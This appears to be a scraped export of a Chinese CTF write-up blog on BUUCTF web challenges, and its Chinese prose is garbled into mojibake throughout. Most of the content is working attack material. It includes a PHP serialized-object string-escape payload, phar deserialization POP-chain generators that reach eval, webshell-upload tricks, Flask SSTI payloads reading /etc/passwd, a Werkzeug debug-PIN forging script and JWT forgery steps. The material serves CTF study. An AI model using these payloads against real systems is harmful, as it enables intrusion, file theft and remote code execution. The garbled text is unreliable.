username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125; æ„é€ å¥½äº†POPé“¾ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¦æ‰¾åˆ°è§¦å‘ååºåˆ—åŒ–çš„ç‚¹ã€‚ ä»update.php å¯ä»¥è·Ÿè¿›Userç±»çš„update()å‡½æ•°ï¼š 1234567public function update()&#123; $Info=unserialize($this-&gt;getNewinfo()); $age=$Info-&gt;age; $nickname=$Info-&gt;nickname; $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]); //è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘&#125; ç»§ç»­è·Ÿè¿›getNewInfo()å‡½æ•° 12345public function getNewInfo()&#123; $age=$_POST[&#x27;age&#x27;]; $nickname=$_POST[&#x27;nickname&#x27;]; return safe(serialize(new Info($age,$nickname)));&#125; è¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªå…ˆåºåˆ—åŒ–åœ¨ç»è¿‡safe()å‡½æ•°å¤„ç†çš„Infoç±»å¯¹è±¡ã€‚ æ‰€ä»¥æœ€ç»ˆèƒ½å¤Ÿååºåˆ—åŒ–çš„ä¸æ˜¯æˆ‘ä»¬ç›´æ¥ä¼ å…¥çš„å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯ç”¨æˆ‘ä»¬çš„å€¼å®ä¾‹åŒ–ä¸€ä¸ªInfoç±»çš„å¯¹è±¡ï¼Œç„¶åå¯¹è¿™ä¸ªå¯¹è±¡è¿›è¡Œå®ä¾‹åŒ–ï¼Œå†å¯¹è¿™ä¸ªåºåˆ—åŒ–ç»“æœè¿›è¡Œsafe()å¤„ç†ï¼Œæœ€åå¾—åˆ°çš„å€¼å†è¿›è¡Œååºåˆ—åŒ–ã€‚ æ‰€ä»¥æƒ³è¦å‘åºåˆ—åŒ–æˆ‘ä»¬çš„payloadï¼Œå°±å¾—æ§åˆ¶ Infoç±»å¯¹è±¡çš„åºåˆ—åŒ–ä¸²ï¼Œçœ‹ä¸€ä¸‹è¿™ä¸ªåºåˆ—åŒ–ä¸²çš„æ ¼å¼ ï¼ˆå‡è®¾age=20ï¼›nickname=letheï¼‰ï¼š 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;20&quot;;s:8:&quot;nickname&quot;;s:5:&quot;lethe&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; è¿™é‡Œçš„åŸç†æœ‰ç‚¹ç±»ä¼¼æ³¨å…¥ï¼Œéƒ½æ˜¯é—­åˆï¼Œå…ˆçœ‹ä¸€ä¸‹æˆ‘ä»¬æ„é€ çš„payloadå¦‚ä¸‹ï¼Œæœªé€ƒé€¸å­—ç¬¦ä¸²å‰: 1&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125; å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœ¨å·²åºåˆ—åŒ–ä¸²å‰é¢åŠ ä¸Šäº†&quot;;s:8:&quot;CtrlCase&quot;;ï¼Œåœ¨æœ€ååŠ ä¸Šäº†ä¸€ä¸ª&#125;ï¼ˆæ•´ä¸ªé•¿åº¦ä¸º263ï¼‰ï¼Œè¿™æ ·æˆ‘ä»¬å°†å…¶ä½œä¸ºnew Info($age,$nickname)çš„nicknameä¼ å…¥æ—¶ï¼Œåºåˆ—åŒ–çš„ç»“æœå¦‚ä¸‹ï¼š 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;20&quot;;s:8:&quot;nickname&quot;;s:263:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; ä½†æ˜¯é•¿åº¦ä¸º263çš„payloadè¿˜æ˜¯å½“ä½œäº†ä¸€ä¸ªæ™®é€šå­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯åºåˆ—åŒ–é‡Œçš„å†…å®¹ã€‚ è¿™æ—¶å€™å°±éœ€è¦ç”¨åˆ°å­—ç¬¦é€ƒé€¸çš„åŸç†äº†ï¼Œæˆ‘ä»¬åœ¨payloadçš„å‰é¢åŠ ä¸Š263ä¸ªunionï¼Œåœ¨ç»è¿‡safeå‡½æ•°ä¹‹åï¼Œunionå…¨éƒ¨è¢«æ›¿æ¢æˆhackerï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºæ–°å¢äº†263ä¸ªå­—ç¬¦ï¼Œè¿™æ ·å°±å¯¼è‡´è·Ÿåœ¨åé¢çš„é•¿åº¦ä¸º263ä¸ªå­—ç¬¦çš„payloadæˆåŠŸé€ƒé€¸ã€‚ è€Œä¹‹æ‰€å‰é¢æ„é€ çš„æ—¶å€™åœ¨æœ€åé¢åŠ ä¸€ä¸ª&#125;ï¼Œæ˜¯å› ä¸ºInfoç±»çš„å¯¹è±¡åªæœ‰3ä¸ªå˜é‡ï¼Œ&#125;å‰é¢å·²ç»æœ‰3ä¸ªå˜é‡æ»¡è¶³äº†åºåˆ—åŒ–ä¸²çš„è¦æ±‚äº†ï¼Œæ‰€ä»¥åŠ ä¸€ä¸ª&#125;æ¥é—­åˆæ•´ä¸ªåºåˆ—åŒ–ä¸²ã€‚ æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š 1age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125; åœ¨update.phpå†…postæäº¤age=123&amp;nickname=åé¢æ¥ä¸Šè¾“å‡ºç»“æœï¼Œå°±ä¼šå¾—åˆ°adminå¯†ç çš„md5ã€‚ SWPU2019 SimplePHP è€ƒç‚¹ æ–‡ä»¶åŒ…å« Pharååºåˆ—åŒ– è§£é¢˜ æŸ¥çœ‹æ–‡ä»¶é¡µé¢æœ‰æ–‡ä»¶åŒ…å«ï¼Œå¯ä»¥è¯»å–æºç ï¼š file.php 1234567891011121314151617&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); include &#x27;function.php&#x27;; include &#x27;class.php&#x27;; ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;); $file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;; if(empty($file)) &#123; echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123; $show-&gt;source = $file; $show-&gt;_show(); &#125; else if (!empty($file))&#123; die(&#x27;file doesn\\&#x27;t exists.&#x27;); &#125; ?&gt; function.php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123; global $_FILES; $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; //mkdir(&quot;upload&quot;,0777); if(file_exists(&quot;upload/&quot; . $filename)) &#123; unlink($filename); &#125; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#x27;; &#125; function upload_file() &#123; global $_FILES; if(upload_file_check()) &#123; upload_file_do(); &#125; &#125; function upload_file_check() &#123; global $_FILES; $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); $extension = end($temp); if(empty($extension)) &#123; //echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;; &#125; else&#123; if(in_array($extension,$allowed_types)) &#123; return true; &#125; else &#123; echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;; return false; &#125; &#125; &#125; ?&gt; class.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; &#125; public function __toString() &#123; $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match(&#x27;/http|https|file:|gopher|dict|\\.\\.|f1ag/i&#x27;,$this-&gt;source)) &#123; die(&#x27;hacker!&#x27;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125;?&gt; class.phpä¸­æœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„POPé“¾ï¼Œæ­¤å¤–ï¼Œç”±äºæ²¡æœ‰unserializeå‡½æ•°è§¦å‘ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆå°±åªèƒ½ä¸Šä¼ ä¸€ä¸ªpharæ¥è§¦å‘ååºåˆ—åŒ–ã€‚ 1234567891011121314151617181920212223242526272829303132&lt;?phpclass C1e4r&#123; public $test; public $str;&#125;class Show&#123; public $source; public $str;&#125;class Test&#123; public $file; public $params;&#125;$c1e4r = new C1e4r();$show = new Show();$test = new Test();$c1e4r-&gt;str = $show;$show-&gt;str[&#x27;str&#x27;] = $test;$test-&gt;params[&#x27;source&#x27;] = &#x27;/var/www/html/f1ag.php&#x27;;$phar = new Phar(&quot;exp.phar&quot;); //.pharæ–‡ä»¶$phar-&gt;startBuffering();$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;); //å›ºå®šçš„$phar-&gt;setMetadata($c1e4r); //è§¦å‘çš„å¤´æ˜¯C1e4rç±»ï¼Œæ‰€ä»¥ä¼ å…¥C1e4rå¯¹è±¡$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //éšä¾¿å†™ç‚¹ä»€ä¹ˆç”Ÿæˆä¸ªç­¾å$phar-&gt;stopBuffering(); ç”Ÿæˆexp.pharåæ”¹åç¼€ä¸ºgifï¼Œç„¶åæŸ¥çœ‹ä¸Šä¼ çš„æ–‡ä»¶å æœ€åä½¿ç”¨pharåè®®è¯»å–è¯¥æ–‡ä»¶ã€‚ è§£ç å¾—åˆ°flagã€‚ GXYCTF2019 Babysqli v3 è€ƒç‚¹ å¼±å£ä»¤ PHPååºåˆ—åŒ– è§£é¢˜ å¼±å£ä»¤çˆ†ç ´ã€‚ã€‚ã€‚ã€‚ã€‚å¾—åˆ°admin/passwordã€‚ PHPä¼ªåè®®è¯»å–æºç php://filter/read=convert.base64-encode/resource=home.php home.php 1234567891011121314151617181920212223242526&lt;?phpsession_start();echo &quot;&lt;meta http-equiv=\\&quot;Content-Type\\&quot; content=\\&quot;text/html; charset=utf-8\\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;;error_reporting(0);if(isset($_SESSION[&#x27;user&#x27;]))&#123; if(isset($_GET[&#x27;file&#x27;]))&#123; if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#x27;file&#x27;]))&#123; die(&quot;hacker!&quot;); &#125; else&#123; if(preg_match(&quot;/home$/i&quot;, $_GET[&#x27;file&#x27;]) or preg_match(&quot;/upload$/i&quot;, $_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;].&quot;.php&quot;; &#125; else&#123; $file = $_GET[&#x27;file&#x27;].&quot;.fxxkyou!&quot;; &#125; echo &quot;å½“å‰å¼•ç”¨çš„æ˜¯ &quot;.$file; require $file; &#125; &#125; else&#123; die(&quot;no permission!&quot;); &#125;&#125;?&gt; upload.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; ä¸Šä¼ æ–‡ä»¶ &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot; /&gt;&lt;/form&gt;&lt;?phperror_reporting(0);class Uploader&#123; public $Filename; public $cmd; public $token; function __construct()&#123; $sandbox = getcwd().&quot;/uploads/&quot;.md5($_SESSION[&#x27;user&#x27;]).&quot;/&quot;; $ext = &quot;.txt&quot;; @mkdir($sandbox, 0777, true); if(isset($_GET[&#x27;name&#x27;]) and !preg_match(&quot;/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i&quot;, $_GET[&#x27;name&#x27;]))&#123; $this-&gt;Filename = $_GET[&#x27;name&#x27;]; &#125; else&#123; $this-&gt;Filename = $sandbox.$_SESSION[&#x27;user&#x27;].$ext; &#125; $this-&gt;cmd = &quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;; $this-&gt;token = $_SESSION[&#x27;user&#x27;]; &#125; function upload($file)&#123; global $sandbox; global $ext; if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123; $this-&gt;cmd = &quot;die(&#x27;illegal filename!&#x27;);&quot;; &#125; else&#123; if($file[&#x27;size&#x27;] &gt; 1024)&#123; $this-&gt;cmd = &quot;die(&#x27;you are too big (â€²â–½`ã€ƒ)&#x27;);&quot;; &#125; else&#123; $this-&gt;cmd = &quot;move_uploaded_file(&#x27;&quot;.$file[&#x27;tmp_name&#x27;].&quot;&#x27;, &#x27;&quot; . $this-&gt;Filename . &quot;&#x27;);&quot;; &#125; &#125; &#125; function __toString()&#123; global $sandbox; global $ext; // return $sandbox.$this-&gt;Filename.$ext; return $this-&gt;Filename; &#125; function __destruct()&#123; if($this-&gt;token != $_SESSION[&#x27;user&#x27;])&#123; $this-&gt;cmd = &quot;die(&#x27;check token falied!&#x27;);&quot;; &#125; eval($this-&gt;cmd); &#125;&#125;if(isset($_FILES[&#x27;file&#x27;])) &#123; $uploader = new Uploader(); $uploader-&gt;upload($_FILES[&quot;file&quot;]); if(@file_get_contents($uploader))&#123; echo &quot;ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;; echo file_get_contents($uploader); &#125;&#125;?&gt; é¢„æœŸè§£ Pharååºåˆ—åŒ– å…ˆä»»æ„ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶è·å¾—tokençš„å€¼ ç”Ÿæˆpharæ–‡ä»¶ 123456789101112131415161718&lt;?phpclass Uploader&#123; public $Filename; public $cmd; public $token;&#125;$upload = new Uploader();$upload-&gt;cmd = &quot;highlight_file(&#x27;/var/www/html/flag.php&#x27;);&quot;;$upload-&gt;Filename = &#x27;test&#x27;;$upload-&gt;token = &#x27;GXY063c630ae7ab41c6fd121cb4851620a3&#x27;;$phar = new Phar(&quot;exp.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;);$phar-&gt;setMetadata($upload); $phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering(); ç„¶åå°†ç”Ÿæˆçš„pharä¸Šä¼  å¾—åˆ°è·¯å¾„/var/www/html/uploads/cdc81ac06b78e980da728ecd95e747a8/GXY063c630ae7ab41c6fd121cb4851620a3.txt ç„¶åå°†è¿™ä¸ªè·¯å¾„å¸¦ä¸Šphar://ä½œä¸ºnameå‚æ•°çš„å€¼ï¼Œå†éšæ„ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œå› ä¸º$this-&gt;Filenameè¢«æˆ‘ä»¬æ‰‹å·¥æŒ‡å®šä¸ºpharï¼Œè§¦å‘äº†pharååºåˆ—åŒ–å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚ éé¢„æœŸè§£1 å…³é”®çš„åœ°æ–¹åœ¨äºæ­£åˆ™å†™çš„æœ‰é—®é¢˜ 123456if(isset($_GET[&#x27;name&#x27;]) and !preg_match(&quot;/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i&quot;, $_GET[&#x27;name&#x27;]))&#123; $this-&gt;Filename = $_GET[&#x27;name&#x27;];&#125;else&#123; $this-&gt;Filename = $sandbox.$_SESSION[&#x27;user&#x27;].$ext;&#125; å®é™…ä¸ŠåŒ¹é…çš„æ˜¯ .ï¼ˆç©ºæ ¼ç‚¹ï¼‰ã€‚``upload()å†…ï¼Œåªè¦æ–‡ä»¶å°äº1024ï¼Œå°±å°†ä¸Šä¼ æ–‡ä»¶åˆ°$this-&gt;Filename` é‚£æˆ‘ä»¬åªè¦ä½¿$this-&gt;Filenameä¸º/var/www/html/uploads/shell.phpï¼Œç„¶åä¸Šä¼ ä¸€ä¸ªtxtçš„ä¸€å¥è¯å³å¯getshell éé¢„æœŸè§£2 ç”±äºè¿™è¡Œä»£ç  1echo file_get_contents($uploader); ä¸Šä¼ åä¼šæ˜¾ç¤ºå‡º$uploaderè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œæ‰€ä»¥åªè¦ä½¿$this-&gt;Filenameä¸ºflag.php ç„¶åéšä¾¿ä¼ ä¸ªä¸œè¥¿å°±ä¼šå¾—åˆ°flagäº†ã€‚ MRCTF2020 Ezpop_Revenge TODO","tags":[],"categories":[]},{"title":"buuctfåˆ·é¢˜â€”â€”NodeJS","date":"2020-08-18T09:59:40.000Z","path":"Web_security/ctf_writeup/14.buuctfåˆ·é¢˜â€”â€”NodeJS/","text":"GKCTF2020 EZä¸‰å‰‘å®¢-EzNode GYCTF2020 Node Game GKCTF2020 Node-Exe GYCTF2020 Ez_Express HFCTF2020 EasyLogin HFCTF2020 JustEscape","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"NodeJS","slug":"CTF/NodeJS","permalink":"http://ca0y1h.top/categories/CTF/NodeJS/"}]},{"title":"buuctfåˆ·é¢˜â€”â€”Python","date":"2020-08-18T09:59:30.000Z","path":"Web_security/ctf_writeup/13.buuctfåˆ·é¢˜â€”â€”Python/","text":"BUUCTFåˆ·é¢˜â€”â€”Python GYCTF2020 flaskapp è€ƒç‚¹ Flask debug pinç å®‰å…¨ https://xz.aliyun.com/t/2553 è§£é¢˜ æ‰“å¼€é¢˜ç›®æœ‰ä¸€ä¸ªhintç•Œé¢ï¼ŒæŸ¥çœ‹æºç  æ„æ€åº”è¯¥æ˜¯å»ä¼ªé€ Flask pinç„¶åæ‰§è¡Œå‘½ä»¤ã€‚ å…ˆæ¥éªŒè¯ä¸€ä¸‹ï¼š 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[0].__init__&#125;&#125; ç„¶åè¿˜è¦æ‰¾åˆ°ä¸€ä¸ªè¯»æ–‡ä»¶çš„payloadï¼Œå‘ç°evalä¸èƒ½ç”¨ï¼Œç”¨openå¯ä»¥è¯» 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125;&#125; æ¥ä¸‹æ¥å°±æ˜¯è¦è·å–6ä¸ªå…³é”®å‚æ•° 1234567891011username # ç”¨æˆ·åmodname # flask.appgetattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) # Flaskgetattr(mod, &#39;__file__&#39;, None) # flaskç›®å½•ä¸‹çš„ä¸€ä¸ªapp.pyçš„ç»å¯¹è·¯å¾„uuid.getnode() # macåœ°å€åè¿›åˆ¶get_machine_id() # &#x2F;etc&#x2F;machine-id ç¬¬ä¸€ä¸ªç”¨æˆ·åå¯ä»¥é€šè¿‡/etc/passwdå¾—åˆ°ï¼Œå³flaskweb ç¬¬äºŒä¸ªmodnameä¸€èˆ¬éƒ½æ˜¯é»˜è®¤çš„flask.app ç¬¬ä¸‰ä¸ªä¹Ÿæ˜¯é»˜è®¤çš„Flask ç¬¬å››ä¸ªæ˜¯app.pyçš„ç»å¯¹è·¯å¾„ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡æŠ¥é”™æ¥è·å– ç¬¬å››ä¸ªmacåœ°å€å¦‚æœåœ¨çœŸå®ç¯å¢ƒæ˜¯ä»/etc/machine-idæ–‡ä»¶è¯»å–ï¼Œå¦‚æœæ˜¯åœ¨dockerä¸‹ï¼Œæ˜¯ä»/sys/class/net/eth0/addressç›®å½•ä¸‹è¯»å–ï¼Œè½¬æ¢æˆåè¿›åˆ¶2485410468126 è½¬æ¢åœ°å€ï¼šhttps://www.vultr.com/resources/mac-converter/ ç¬¬äº”ä¸ªé€šè¿‡è¯»å–/proc/self/cgroupè·å–machine-idï¼š1408f836b0ca514d796cbf8960e45fa1 ç„¶åå†ä¸Šè„šæœ¬è·‘å‡ºPINç  123456789101112131415161718192021222324252627282930313233343536373839404142#è„šæœ¬å‡ºå¤„ï¼šhttps://xz.aliyun.com/t/2553import hashlibfrom itertools import chainprobably_public_bits = [ &#x27;flaskweb&#x27;,# username &#x27;flask.app&#x27;, &#x27;Flask&#x27;, &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27; ]private_bits = [ &#x27;2485377957891&#x27;,# address &#x27;e96996169e90130c1b6e2b3fb9af5b39abcacc1b1f84211a58e27854c3a1219e&#x27;# machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) systemå¥½åƒè¢«ç¦ç”¨äº†ï¼Œæ¢æˆpopenå‡½æ•° RootersCTF2019 I_â¤ï¸_Flask CSCCTF 2019 Qual FlaskLight pasecactf_2019 flask_ssti CISCN2019 ååŒ—èµ›åŒº Web2 ikun è€ƒç‚¹ é€»è¾‘æ¼æ´ JWTä¼ªé€  pickleååºåˆ—åŒ– è§£é¢˜ pythonè„šæœ¬å¯»æ‰¾LV6å•†å“æ‰€åœ¨é¡µé¢ 123456789101112131415import requestsurl = &quot;http://4186a81c-5092-4d1c-b2c3-6d753ef436c7.node3.buuoj.cn/shop?page=&#123;&#125;&quot;cookies = &#123; &quot;_xsrf&quot;: &quot;2|9abd3196|175f180123b348c52281c861b9ea6ba9|1593758159&quot;, &quot;JWT&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhMDFoIn0.xjww69DlZAtZw_26KzwvCZc&quot; &quot;-WhNxACW3PuvxHlQQ2yg&quot;, &quot;commodity_id&quot;: &quot;2|1:0|10:1593758858|12:commodity_id|4:Nw&quot; &quot;==|42eb3fadf203ceac3f14f89b8e7a575d5350b31a29c08f6a939d099435027244 &quot;&#125;for i in range(1, 501): rq = requests.get(url=url.format(i), cookies=cookies) if &quot;/static/img/lv/lv6.png&quot; in rq.text: print(url.format(i)) è·‘å‡ºæ¥çš„ç»“æœæ˜¯page=181 ä½†æ˜¯çœ‹åˆ°è¿™ä¸ªä»·æ ¼å¾ˆæ˜¾ç„¶æ˜¯è¦é€šè¿‡æŸç§æ¼æ´æ¥è´­ä¹°ï¼Œå…ˆæŠ“åŒ…ï¼Œçœ‹åˆ°å‚æ•°åæƒ³åˆ°ä¸¤ç§åŠæ³•ï¼Œä¸€æ˜¯ç›´æ¥æ”¹ä»·æ ¼ï¼ŒäºŒæ˜¯æ”¹æŠ˜æ‰£ã€‚ å°è¯•ä¹‹åå‘ç°æ”¹ä»·æ ¼æ²¡æœ‰ç”¨ï¼Œæ”¹æŠ˜æ‰£æç¤ºä¸æ˜¯admin è¿™ä¸ªåœ°æ–¹å°±å¾ˆè‡ªç„¶æƒ³åˆ°è¦è¶Šæƒï¼Œä¿®æ”¹å¯†ç å¤„æ²¡æœ‰é€»è¾‘æ¼æ´ï¼Œä½†æ˜¯Cookieä¸­åŒ…å«JWTï¼Œæ”¾åˆ°jwt.ioç½‘å€ä¸Šè§£æåï¼š å¦‚æœæƒ³è¦ä¼ªé€ ä¸€ä¸ªadminçš„JWTéœ€è¦çŸ¥é“secretã€‚æ„Ÿè§‰è¿™ä¸ªåœ°æ–¹å°±æœ‰ç‚¹è„‘æ´äº†ï¼Œè¦ç”¨å·¥å…·å»çˆ†ç ´ï¼Œæˆ‘è¿˜æ‰¾äº†å¾ˆä¹…çš„æ³¨å…¥ç‚¹ã€‚ å†å»ä¼ªé€ adminçš„JWT æ›´æ”¹cookieçš„å€¼ æŸ¥çœ‹ä¸ªäººä¸­å¿ƒï¼Œå‡ºç°äº†ä¸€ä¸ªhint 1\\u8fd9\\u7f51\\u7ad9\\u4e0d\\u4ec5\\u53ef\\u4ee5\\u4ee5\\u8585\\u7f8a\\u6bdb\\uff0c\\u6211\\u8fd8\\u7559\\u4e86\\u4e2a\\u540e\\u95e8\\uff0c\\u5c31\\u85cf\\u5728\\u006c\\u0076\\u0036\\u91cc æŸ¥çœ‹æºç å‘ç°æºç åŒ…ï¼š 